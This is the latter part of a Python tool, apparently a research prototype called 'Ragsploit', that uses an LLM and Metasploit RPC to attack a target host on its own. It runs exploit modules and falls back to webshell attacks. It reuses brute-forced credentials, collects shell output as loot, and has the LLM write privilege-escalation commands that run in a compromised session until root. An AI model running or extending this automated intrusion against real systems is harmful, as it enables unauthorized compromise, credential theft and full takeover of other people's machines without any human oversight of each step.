                                print(f"{C_BLUE}[AI AUTO-CORRECTION] {new_plan.get('reason', 'Parametros ajustados.')}{C_RESET}")
                            except Exception as e:
                                print(f"{C_RED}[ERRO AI] Falha ao processar reajuste.{C_RESET}")
                
                if not self.session_id:
                    print(f"{C_RED}[FALHA GERAL] Todas as tentativas de exploit falharam.{C_RESET}")
                    # Escala p/ TIER C (manual) em servicos web: o LLM tenta via
                    # shell (webshell/PoC HTTP) o que o modulo MSF nao conseguiu.
                    if self._is_web(port, banner):
                        print(f"{C_YELLOW}[*] Escalando para TIER C (exploracao manual)...{C_RESET}")
                        self.run_manual_exploit(port, banner, web_context, rag_context)

            if not (self.session_id or self.manual_access):
                if strategy in ("brute_force", "enumeration", "exploit_cve") and len(tried) + 1 < MAX_STRATS:
                    attack_queue.insert(0, (port, banner, f"'{strategy}' nao obteve shell", tried + [strategy]))
                    print(f"{C_YELLOW}[*] Estrategia '{strategy}' falhou na porta {port}; reconsultando o LLM por uma estrategia ALTERNATIVA...{C_RESET}")
            if self.session_id or self.manual_access:
                print(f"{C_GREEN}[!] Acesso obtido. Parando scan.{C_RESET}")
                break
        
        if self.session_id:
            self.phase_4_post_exploitation()
            self.phase_5_privesc()
        self.store_attack_experience()
        self.generate_text_report()

    def _add_cred(self, port, banner, user, pwd):
        """Guarda uma credencial valida obtida no brute para reuso/chaining."""
        svc = (self.services.get(port, {}).get("service", "") or banner or "")[:40]
        rec = {"port": port, "service": svc, "user": user, "pass": pwd}
        if rec not in self.found_creds:
            self.found_creds.append(rec)
            print(f"{C_GREEN}[CRED+] guardada {user}:{pwd} (porta {port}) para reuso/chaining{C_RESET}")

    def _inject_creds(self, m_type, m_name, opts, port):
        """Rede de seguranca: se ha credenciais obtidas e o modulo aceita nomes de
        opcao de credencial ainda nao preenchidos, injeta a melhor cred (prefere a
        do mesmo port). So age quando o modulo REALMENTE tem essas opcoes."""
        if not self.found_creds:
            return
        cred = next((c for c in reversed(self.found_creds) if str(c["port"]) == str(port)),
                    self.found_creds[-1])
        try:
            names = set(self.msf.module_option_names(m_type, m_name))
        except Exception:
            names = set()
        for u, p in (("USERNAME", "PASSWORD"), ("USER", "PASS"),
                     ("SMBUser", "SMBPass"), ("FTPUSER", "FTPPASS"),
                     ("DB_USERNAME", "DB_PASSWORD")):
            if u in names and p in names:
                if not opts.get(u):
                    opts[u] = cred["user"]
                if not opts.get(p):
                    opts[p] = cred["pass"]
                print(f"{C_BLUE}[CRED-INJECT] {u}/{p} = {cred['user']}:{cred['pass']} (cred obtida reutilizada){C_RESET}")
                break

    def phase_5_privesc(self, max_rounds=4):
        """FASE 5: se a sessao e de baixo privilegio (uid != 0), o LLM AUTORA
        comandos de escalonamento executados NA SHELL da sessao MSF ate uid=0."""
        if not self.session_id:
            return False
        info = self.evidence.get("shell_info", "") or ""
        if "uid=0(root)" in info:
            print(f"{C_GREEN}[PRIVESC] Ja e root (uid=0); escalonamento desnecessario.{C_RESET}")
            return True
        print(f"\n>>> [FASE 5] ESCALONAMENTO DE PRIVILEGIO (uid != 0)")

        def sh(cmd, wait=4):
            try:
                self.msf.client.call('session.shell_write', [self.session_id, cmd + "\n"])
                time.sleep(wait)
                res = self.msf.client.call('session.shell_read', [self.session_id])
                return (res or {}).get('data', '') or ''
            except Exception as e:
                return f"[erro shell: {e}]"

        enum = sh("id; uname -a; sudo -n -l 2>/dev/null; "
                  "find / -perm -4000 -type f 2>/dev/null | head -40; "
                  "ls -l /etc/passwd /etc/shadow 2>/dev/null; which gcc python perl", wait=6)
        print(f"{C_CYAN}{enum}{C_RESET}")

        rag_ctx = ""
        if self.use_rag and self.rag:
            try:
                docs = self.rag.query("linux privilege escalation SUID sudo kernel cron "
                                      "writable passwd root uid 0 gtfobins", k=5)
                rag_ctx = "\n\n".join(d.page_content for d in docs[:5])
            except Exception:
                pass

        history = [("initial enumeration", enum)]
        for rnd in range(1, max_rounds + 1):
            hist_txt = "\n".join(f"$ {c}\n{o[:600]}" for c, o in history[-4:])
            prompt = f"""
YOU ARE A PENTESTER escalating from a low-priv shell to ROOT on {self.target_ip}
(CONTROLLED LAB). You run commands INSIDE the compromised shell (uid != 0).

ENUMERATION AND HISTORY SO FAR:
{hist_txt}

KNOWLEDGE BASE (RAG):
{rag_ctx}

Author shell commands to escalate to uid=0(root). Prefer NON-INTERACTIVE one-liners
(no vim/less/--interactive in a non-tty shell). Consider: sudo NOPASSWD, SUID
GTFObins, world-writable /etc/passwd, cron, or a gcc kernel PoC (only if gcc exists).

Return JSON ONLY:
{{"commands": ["cmd1", "cmd2"], "success_check": "uid=0", "done": false, "reason": "what/why"}}
If the history already shows uid=0(root), set done=true.
"""
            resp = self.ask_llm_robust(prompt)
            if not resp:
                print(f"{C_RED}[PRIVESC] LLM sem resposta.{C_RESET}")
                break
            try:
                if "{" in resp:
                    resp = resp[resp.find("{"):resp.rfind("}") + 1]
                plan = json.loads(resp)
            except Exception:
                print(f"{C_RED}[PRIVESC] JSON invalido do LLM.{C_RESET}")
                break
            print(f"{C_BLUE}[PRIVESC] {plan.get('reason', '(sem motivo)')}{C_RESET}")
            check = (plan.get("success_check") or "uid=0").strip()
            cmds = plan.get("commands") or []
            if plan.get("done") and not cmds:
                break
            for cmd in cmds:
                print(f"{C_YELLOW}[PRIVESC] $ {cmd}{C_RESET}")
                out = sh(cmd, wait=5)
                verify = sh("id", wait=2)
                combined = out + verify
                print(f"{C_CYAN}{out}{C_RESET}")
                history.append((cmd, combined))
                if "uid=0(root)" in combined:
                    print(f"{C_GREEN}[***] ROOT! Escalonamento bem-sucedido via: {cmd}{C_RESET}")
                    self.evidence["privesc"] = {"command": cmd, "output": combined[:1500]}
                    self.history.append(f"[PRIVESC ROOT] sessao {self.session_id}: {cmd}")
                    return True
        print(f"{C_RED}[PRIVESC] Nao escalou para root nesta execucao.{C_RESET}")
        return False

    def phase_4_post_exploitation(self):
        print(f"\n>>> [FASE 4] POST-EXPLORACAO")
        try:
            self.msf.client.call('session.shell_write', [self.session_id, "id; hostname\n"])
            time.sleep(3)
            res = self.msf.client.call('session.shell_read', [self.session_id])
            print(f"{C_GREEN}{res['data']}{C_RESET}")
            self.evidence["shell_info"] = str(res['data'])
            
            with open(f"{LOOT_DIR}/pwned.txt", "w") as f:
                f.write(f"ALVO: {self.target_ip}\nSESSAO: {self.session_id}\nDADOS: {res['data']}")
        except: pass

def get_best_route_ip(target_ip):
    """Descobre o IP de LHOST correto simulando uma rota ate o alvo."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect((target_ip, 1)) 
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except Exception:
        return "192.168.70.20"

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Pipeline Single Target - Autonomo Ragsploit")
    parser.add_argument("--target", type=str, default=None, help="IP do alvo (ex: 10.0.0.1); se omitido, usa config/target.json")
    parser.add_argument("--disable-rag", action="store_true", help="Desativa o RAG (ChromaDB): roda o modelo isoladamente (baseline).")
    parser.add_argument("--port", type=int, default=None, help="Restringe a analise a UMA porta (ex: 139), para A/B RAG on/off.")
    args = parser.parse_args()

    target = resolve_target(args.target)
    # LHOST deve ser a caixa onde o handler do Metasploit (msfrpcd) roda,
    # nao o orquestrador: o reverse shell do alvo volta para o MSF host.
    lhost = os.getenv("MSF_RPC_HOST", "192.168.70.20")

    p = PentestPipeline(target_ip=target, attacker_ip=lhost, use_rag=not args.disable_rag, only_port=args.port)
    try:
        p.run()
        if p.session_id:
            p.enter_interactive_mode()
    except KeyboardInterrupt:
        print(f"\n{C_YELLOW}[!] Interrupcao detectada. Salvando logs...{C_RESET}")
        p.generate_text_report()